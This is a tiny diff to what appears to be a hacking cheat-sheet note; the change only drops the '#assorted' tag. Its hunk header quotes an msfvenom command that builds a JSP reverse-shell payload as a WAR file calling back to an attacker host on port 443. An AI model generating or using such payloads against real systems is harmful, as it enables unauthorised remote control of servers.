@@ -10,4 +10,4 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f war -o shell.wa
 
 Tags:
 
-    #assorted #command #hacking #msfvenom
+    #command #hacking #msfvenom 
